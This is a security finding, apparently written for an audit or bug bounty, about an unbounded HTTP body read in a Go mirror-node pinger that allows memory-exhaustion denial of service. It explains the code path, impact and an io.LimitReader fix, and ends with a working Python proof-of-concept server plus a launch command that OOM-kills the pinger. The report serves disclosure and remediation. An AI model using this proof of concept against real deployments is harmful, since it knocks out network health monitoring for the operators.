### Title
Unbounded HTTP Response Body Read in `fetchMirrorNodeNetwork` Enables Memory Exhaustion DoS

### Summary
`fetchMirrorNodeNetwork()` in `pinger/mirror_node_client.go` passes `resp.Body` directly to `json.NewDecoder` with no size cap. A mirror node that returns an arbitrarily large JSON payload — for example, a `nodes` array containing entries with extremely long `node_account_id` strings — forces the pinger process to allocate unbounded heap memory before any field-level validation occurs. The pinger container's hard memory ceiling of 20 MiB means a response exceeding that threshold triggers an OOM kill, crashing the pinger.

### Finding Description
**Exact code path:**

`pinger/mirror_node_client.go`, `fetchMirrorNodeNetwork()`, line 96:

```go
if err := json.NewDecoder(resp.Body).Decode(&payload); err != nil {
```

`resp.Body` is the raw, unbuffered HTTP response stream. No `io.LimitReader`, `http.MaxBytesReader`, or `Content-Length` guard is applied before this call. `encoding/json` streams the body and allocates Go heap objects for every JSON token it encounters — including arbitrarily long string values — before returning control to the caller.

**Root cause / failed assumption:** The code assumes the mirror node will return a reasonably sized response. There is no enforcement of that assumption.

**Exploit flow:**
1. Attacker controls the mirror node endpoint (see Likelihood).
2. Attacker returns a 200 OK response whose body is a valid JSON object matching `nodesEnvelope`, but with a `nodes` array containing entries where `node_account_id` is a syntactically valid but extremely long string (e.g., `"0.0."` followed by tens of millions of digit characters, or simply a huge number of normal-looking entries).
3. `json.NewDecoder(resp.Body).Decode(&payload)` allocates a Go `string` for each `node_account_id` value in full before returning.
4. Total heap allocation exceeds the 20 MiB container memory limit.
5. The Linux OOM killer terminates the pinger process.

**Why existing checks are insufficient:**
- **HTTP timeout** (`cfg.mirrorNodeClientTimeout`, default 10 s): limits wall-clock time, not bytes transferred. A local or fast network can deliver hundreds of megabytes within 10 s.
- **Empty-string guard** (line 103, `if n.NodeAccountID == ""`): evaluated only after the entire JSON body is already decoded and resident in memory.
- **`hiero.AccountIDFromString` error check** (line 107–110): likewise post-decode; rejects malformed IDs but cannot reclaim already-allocated memory.
- **No `io.LimitReader` anywhere in the pinger package** (confirmed by grep — zero matches).

### Impact Explanation
The pinger is a lightweight monitoring component (20 MiB memory limit per `charts/hedera-mirror-pinger/values.yaml` lines 72–73) that submits periodic HBAR transfers to verify network liveness. An OOM crash causes:
- Kubernetes liveness/readiness probes to fail, triggering a restart loop.
- A gap in transaction submission, breaking end-to-end network health monitoring.
- Repeated crashes if the malicious mirror node remains in the rotation, making the pinger permanently unavailable.

Because the pinger is used to validate network health for a high-market-cap network, sustained unavailability of this component constitutes a meaningful operational DoS.

### Likelihood Explanation
**Precondition:** The attacker must be able to serve a crafted HTTP response to the pinger. This is realistic in several scenarios:
- The `network=other` mode lets an operator (or a misconfigured deployment) point `HIERO_MIRROR_PINGER_REST` at an attacker-controlled URL.
- A network-level MITM (no TLS pinning is enforced in the pinger) against an HTTP mirror endpoint.
- A compromised or rogue mirror node instance in a permissioned deployment.

The attack requires a single HTTP response, is trivially repeatable, and needs no authentication or special privileges beyond the ability to respond to the pinger's GET request.

### Recommendation
Wrap `resp.Body` with `io.LimitReader` before passing it to the JSON decoder, choosing a limit that comfortably exceeds any legitimate `/api/v1/network/nodes` response (e.g., 1 MiB):

```go
const maxBodyBytes = 1 << 20 // 1 MiB

limited := io.LimitReader(resp.Body, maxBodyBytes)
if err := json.NewDecoder(limited).Decode(&payload); err != nil {
    return nil, false, fmt.Errorf("decode mirror nodes: %w", err)
}
```

Additionally, consider checking `resp.ContentLength` before reading: if it exceeds the threshold, return an error immediately without reading the body.

### Proof of Concept
```python
# Minimal malicious mirror node (Python)
from http.server import BaseHTTPRequestHandler, HTTPServer
import json, sys

GIANT = "0.0." + "9" * 4_000_000  # ~4 MB per entry

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        body = json.dumps({
            "nodes": [
                {"node_account_id": GIANT,
                 "service_endpoints": [{"domain_name":"","ip_address_v4":"1.2.3.4","port":50211}]}
                for _ in range(10)   # 10 entries × ~4 MB = ~40 MB > 20 MiB limit
            ],
            "links": {"next": None}
        }).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

HTTPServer(("0.0.0.0", 5551), Handler).serve_forever()
```

Run the server, then start the pinger with:
```
HIERO_MIRROR_PINGER_NETWORK=other \
HIERO_MIRROR_PINGER_REST=http://<attacker-ip>:5551 \
./pinger
```

**Expected result:** The pinger process is OOM-killed (exit status 137) before completing startup, and the Kubernetes pod enters a `CrashLoopBackOff` state.
